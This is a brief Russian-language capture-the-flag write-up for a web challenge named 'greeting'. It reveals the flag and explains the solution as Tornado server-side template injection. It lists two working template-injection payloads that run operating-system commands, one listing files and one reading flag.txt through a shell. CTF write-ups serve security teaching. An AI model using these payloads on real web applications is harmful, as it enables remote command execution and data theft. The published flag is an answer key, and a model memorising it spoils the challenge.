## Название: greeting
**Описание**: Просто приветственная страница, казалось бы....
**Флаг**: `rtctf2024{55tI_m0m3nt_L0l}`  
**Решение**:  
tornado SSTI.
примеры рабочих команд:
```
{{ __import__('os').listdir('.') }}
{{ __import__('subprocess').check_output('cat flag.txt', shell=True) }}
```